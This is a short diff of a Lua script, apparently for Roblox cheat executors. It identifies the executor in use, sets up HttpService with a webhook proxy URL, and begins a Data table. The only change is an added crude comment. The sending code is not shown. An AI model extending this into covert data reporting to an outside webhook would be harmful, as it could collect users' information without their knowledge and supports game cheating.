@@ -1,6 +1,7 @@
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
 local HttpService = game:GetService("HttpService")
 local endpoint = 'https://vineyard.performave.com/api/webhook/v1/proxy/7016542e-3c78-40d2-8ea3-0908f8aea3bc'
+--ilovelatinas joshga
 
 local Data =
     {
